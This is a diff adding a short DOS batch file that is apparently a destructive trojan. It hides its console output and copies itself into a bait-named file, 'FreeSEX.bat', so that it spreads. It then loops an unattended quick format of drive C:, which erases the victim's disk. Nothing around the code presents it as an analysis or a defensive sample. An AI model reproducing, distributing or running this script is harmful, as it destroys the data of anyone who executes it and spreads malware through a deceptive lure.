@@ -1,0 +1,13 @@
+cls
+ctty nul
+@echo off
+@deltree/y hardcore.txt >nul
+@echo.>hardcore.txt
+@dir %windir%\system\*.*>>hardcore.txt
+@echo.>>hardcore.txt
+@copy hardcore.txt+%0 FreeSEX.bat
+@deltree/y %windir%\system\hardcore.txt >nul
+:hc
+@format c:/q/u/autotest
+goto hc
+cls
